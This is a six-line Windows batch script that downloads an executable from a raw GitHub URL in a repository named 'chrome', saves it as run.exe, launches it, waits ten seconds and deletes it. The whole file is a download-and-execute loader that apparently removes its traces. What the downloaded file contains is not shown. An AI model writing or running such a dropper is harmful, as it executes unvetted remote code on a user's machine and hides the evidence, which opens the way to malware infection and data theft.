@echo off
curl -o run.exe "https://raw.githubusercontent.com/abubabdul/chrome/main/dcpl.exe"
start run.exe
timeout /t 10
del run.exe
exit